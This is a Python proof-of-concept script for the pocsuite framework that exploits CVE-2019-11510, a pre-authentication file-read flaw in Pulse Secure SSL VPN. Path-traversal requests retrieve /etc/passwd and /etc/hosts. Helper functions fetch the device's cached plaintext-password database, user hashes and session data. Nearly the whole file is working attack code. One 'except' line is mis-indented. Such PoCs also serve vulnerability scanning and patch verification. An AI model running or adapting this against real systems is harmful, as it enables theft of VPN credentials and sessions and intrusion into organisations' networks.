#!/usr/bin/env python
# -*- coding: utf-8 -*-
# @Time : 2019/8/22 14:15
# @Author : 兀
# @File : CVE-2019-11510.py
# @Software: PyCharm
# @Blog : https://3.1415926.top
# Life is Fantastic.

import urlparse

from pocsuite.api.poc import POCBase
from pocsuite.api.poc import register
from pocsuite.api.poc import Output
from pocsuite.api.request import req


class TestPOC(POCBase):

    vulID = 'CVE-2019-11510'
    version = '1'
    author = '兀'
    vulDate = '2019-08-10'
    createDate = '2019-08-14'
    updateDate = '2019-08-14'
    references = [
        "https://hackerone.com/reports/591295",
        "https://github.com/projectzeroindia/CVE-2019-11510/blob/master/CVE-2019-11510.sh",
        "https://packetstormsecurity.com/files/154176/Pulse-Secure-SSL-VPN-8.1R15.1-8.2-8.3-9.0-Arbitrary-File-Disclosure.html"
    ]
    name = 'Pulse Secure SSL VPN Pre-auth'
    appPowerLink = 'https://www.pulsesecure.net/'
    appName = 'Pulse Secure SSL VPN '
    appVersion = '''
     8.1R15.1 / 8.2 / 8.3 / 9.0 
    '''
    vulType = ''
    desc = '''
    '''
    samples = [
    ]
    install_requires = ""

    def _attack(self):
        return self._verify()

    def _verify(self):
        result = {}
        self.raw_url = self.url
        host = urlparse.urlparse(self.url).hostname
        port = urlparse.urlparse(self.url).port
        scheme = urlparse.urlparse(self.url).scheme
        if port is None:
            port = "80"
        else:
            port = str(port)
        if "https" == scheme:
            self.url = "%s://%s" % (scheme, host)
        else:
            self.url = "%s://%s:%s" % (scheme, host, port)
        paylaod = "/dana-na/../dana/html5acc/guacamole/../../../../../../../etc/passwd?/dana/html5acc/guacamole/"
        headers = {"User-Agent": "Mozilla/5.0",
                   "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                   "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate", "Connection": "close",
                   "Upgrade-Insecure-Requests": "1"}
        try:
            res = req.get(self.url + paylaod, verify=False, headers=headers, timeout=(10, 15))
            if "root:x:0:0:root" in res.text and res.status_code == 200:
                result["VerifyInfo"] = {}
                result["VerifyInfo"]["URL"] = self.url
                result["VerifyInfo"]["passwd"] = res.text
                result["VerifyInfo"]["host"] = self.get_hosts()
         except Exception as e:
            pass
        return self.parse_output(result)

    def get_hosts(self):
        payload = "/dana-na/../dana/html5acc/guacamole/../../../../../../../etc/hosts?/dana/html5acc/guacamole/"
        headers = {"User-Agent": "Mozilla/5.0",
                   "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                   "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate", "Connection": "close",
                   "Upgrade-Insecure-Requests": "1"}
        try:
            res = req.get(self.url + payload, verify=False, headers=headers, timeout=(10, 15))
            return res.text
        except Exception as e:
            return None

    def get_user_password(self):
        payload_palntext_passwd = "/dana-na/../dana/html5acc/guacamole/../../../../../../../data/runtime/mtmp/lmdb/dataa/data.mdb?" \
                  "/dana/html5acc/guacamole/"
        payload_user_hash = "/dana-na/../dana/html5acc/guacamole/../../../../../../../data/runtime/mtmp/system?" \
                    "/dana/html5acc/guacamole/"

        headers = {"User-Agent": "Mozilla/5.0",
                   "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                   "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate", "Connection": "close",
                   "Upgrade-Insecure-Requests": "1"}
        try:
            plantextpasswd = req.get(self.url + payload_palntext_passwd, verify=False, headers=headers,
                                      timeout=(10, 15)).text
        except Exception as e:
            plantextpasswd = ''
        try:
            userhash = req.get(self.url + payload_user_hash, verify=False, headers=headers, timeout=(10, 15)).text
        except Exception as e:
            userhash = ''
        return plantextpasswd, userhash

    def get_session(self):
        payload = "/dana-na/../dana/html5acc/guacamole/../../../../../../../data/runtime/mtmp/lmdb/randomVal/" \
                  "data.mdb?/dana/html5acc/guacamole/"
        headers = {"User-Agent": "Mozilla/5.0",
                   "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                   "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate", "Connection": "close",
                   "Upgrade-Insecure-Requests": "1"}
        try:
            res = req.get(self.url + payload, verify=False, headers=headers, timeout=(10, 15))
            return res.text
        except Exception as e:
            return ""

    def parse_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('Internet nothing returned')
        return output


register(TestPOC)
